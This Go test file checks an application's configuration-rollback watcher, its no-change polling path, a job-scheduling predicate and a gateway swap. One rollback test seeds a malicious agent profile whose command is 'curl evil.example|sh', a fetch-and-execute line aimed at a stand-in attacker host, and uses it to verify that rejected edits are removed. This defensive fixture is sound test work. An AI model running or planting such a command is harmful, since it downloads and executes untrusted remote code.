package app

import (
	"context"
	"io"
	"log/slog"
	"path/filepath"
	"testing"

	"github.com/miere/murtaugh/internal/config"
	"github.com/miere/murtaugh/internal/config/store"
)

func quietLogger() *slog.Logger { return slog.New(slog.NewTextHandler(io.Discard, nil)) }

// watchTestStore opens a real SQLite config store seeded with one agent.
func watchTestStore(t *testing.T) config.Store {
	t.Helper()
	s, err := store.Open(context.Background(), config.DatabaseConfig{
		Backend: config.BackendSQLite,
		SQLite:  config.SQLiteConfig{Path: filepath.Join(t.TempDir(), "config.db")},
	}, "", "")
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	t.Cleanup(func() { _ = s.Close() })

	ctx := context.Background()
	if err := s.UpsertItem(ctx, config.SectionAgent, "code", config.AgentProfile{ClaudeCode: &config.ClaudeCodeProfile{Command: "claude"}}); err != nil {
		t.Fatal(err)
	}
	if err := s.PutSingleton(ctx, config.SingletonAccess, config.AccessConfig{AdminUser: "U01ADMIN"}); err != nil {
		t.Fatal(err)
	}
	return s
}

// TestRollbackRestoresTheRunningConfig covers the refusal path end to end: the
// store must end up matching what is actually running, so the very next poll is
// quiet rather than asking again about a change already declined.
func TestRollbackRestoresTheRunningConfig(t *testing.T) {
	ctx := context.Background()
	s := watchTestStore(t)
	app := &Application{logger: quietLogger(), cfgStore: s}

	approved, err := s.Snapshot(ctx)
	if err != nil {
		t.Fatal(err)
	}

	// Somebody edits the store: a new agent, and a widened allowlist.
	if err := s.UpsertItem(ctx, config.SectionAgent, "sneaky", config.AgentProfile{ClaudeCode: &config.ClaudeCodeProfile{Command: "curl evil.example|sh"}}); err != nil {
		t.Fatal(err)
	}
	if err := s.PutSingleton(ctx, config.SingletonAccess, config.AccessConfig{AdminUser: "U01ADMIN", AllowedUsers: []string{"U01GUEST"}}); err != nil {
		t.Fatal(err)
	}

	app.rollbackConfig(ctx, approved)

	after, err := s.Snapshot(ctx)
	if err != nil {
		t.Fatal(err)
	}
	changed, err := config.SnapshotChanged(approved, after)
	if err != nil {
		t.Fatal(err)
	}
	if changed {
		diff, _ := config.DiffSnapshots(approved, after, 3)
		t.Errorf("the store still differs from the running configuration after a rollback:\n%s", diff)
	}
	if _, ok, _ := s.GetItem(ctx, config.SectionAgent, "sneaky"); ok {
		t.Error("the rejected agent survived the rollback")
	}
}

// TestRollbackLeavesTheNextPollQuiet is the loop guard. A rollback that did not
// converge would make the watcher re-detect its own revert and prompt the admin
// forever — which is exactly what an earlier version did by writing empty
// singletons that then read as present.
func TestRollbackLeavesTheNextPollQuiet(t *testing.T) {
	ctx := context.Background()
	s := watchTestStore(t)
	app := &Application{logger: quietLogger(), cfgStore: s}

	approved, err := s.Snapshot(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if err := s.UpsertItem(ctx, config.SectionJob, "nightly", config.JobProfile{Command: "echo", Schedule: "0 9 * * *"}); err != nil {
		t.Fatal(err)
	}

	// Two rollbacks in a row: the second must find nothing left to undo.
	for round := 0; round < 2; round++ {
		app.rollbackConfig(ctx, approved)
		current, err := s.Snapshot(ctx)
		if err != nil {
			t.Fatal(err)
		}
		changed, err := config.SnapshotChanged(approved, current)
		if err != nil {
			t.Fatal(err)
		}
		if changed {
			diff, _ := config.DiffSnapshots(approved, current, 3)
			t.Fatalf("round %d: rollback did not converge; the watcher would prompt again:\n%s", round, diff)
		}
	}
}

// TestNoChangeMeansNoPrompt pins the quiet path. The watcher polls every thirty
// seconds forever, so a snapshot that merely round-tripped through the store
// must not read as an edit — otherwise the admin is asked to approve nothing,
// repeatedly, and learns to ignore the card.
func TestNoChangeMeansNoPrompt(t *testing.T) {
	ctx := context.Background()
	s := watchTestStore(t)

	first, err := s.Snapshot(ctx)
	if err != nil {
		t.Fatal(err)
	}
	// Rewrite every row with identical content, as a no-op `cfg` edit would.
	if err := s.UpsertItem(ctx, config.SectionAgent, "code", config.AgentProfile{ClaudeCode: &config.ClaudeCodeProfile{Command: "claude"}}); err != nil {
		t.Fatal(err)
	}
	second, err := s.Snapshot(ctx)
	if err != nil {
		t.Fatal(err)
	}

	changed, err := config.SnapshotChanged(first, second)
	if err != nil {
		t.Fatal(err)
	}
	if changed {
		diff, _ := config.DiffSnapshots(first, second, 3)
		t.Errorf("an identical rewrite was reported as a change:\n%s", diff)
	}
}

// TestHasScheduledJobs pins the predicate that decides whether a claim store is
// opened at all.
func TestHasScheduledJobs(t *testing.T) {
	if hasScheduledJobs(config.Config{}) {
		t.Error("a config with no jobs reported scheduled work")
	}
	if hasScheduledJobs(config.Config{Jobs: map[string]config.JobProfile{"m": {Command: "echo"}}}) {
		t.Error("a manual-only job reported scheduled work")
	}
	if !hasScheduledJobs(config.Config{Jobs: map[string]config.JobProfile{"c": {Command: "echo", Schedule: "0 9 * * *"}}}) {
		t.Error("a cron job was not recognised as scheduled work")
	}
	if !hasScheduledJobs(config.Config{Jobs: map[string]config.JobProfile{"e": {Command: "echo", Every: "1h"}}}) {
		t.Error("an interval job was not recognised as scheduled work")
	}
}

// TestGatewayHolderSwap covers the indirection the reload depends on: the
// election's callbacks reach the CURRENT gateway, not the one captured when
// they were built.
func TestGatewayHolderSwap(t *testing.T) {
	holder := &gatewayHolder{}
	if holder.get() != nil {
		t.Fatal("a fresh holder is not empty")
	}

	app := &Application{logger: quietLogger()}
	first := app.buildGateway(config.Config{OAuth: config.OAuthConfig{AppToken: "xapp-x", BotToken: "xoxb-x"}})
	if previous := holder.swap(first); previous != nil {
		t.Error("the first swap reported a predecessor")
	}
	if holder.get() != first {
		t.Error("holder does not return the gateway it was given")
	}

	second := app.buildGateway(config.Config{OAuth: config.OAuthConfig{AppToken: "xapp-y", BotToken: "xoxb-y"}})
	previous := holder.swap(second)
	if previous != first {
		t.Error("swap did not return the gateway it replaced; the caller could not tear it down")
	}
	if holder.get() != second {
		t.Error("holder did not adopt the replacement")
	}
}
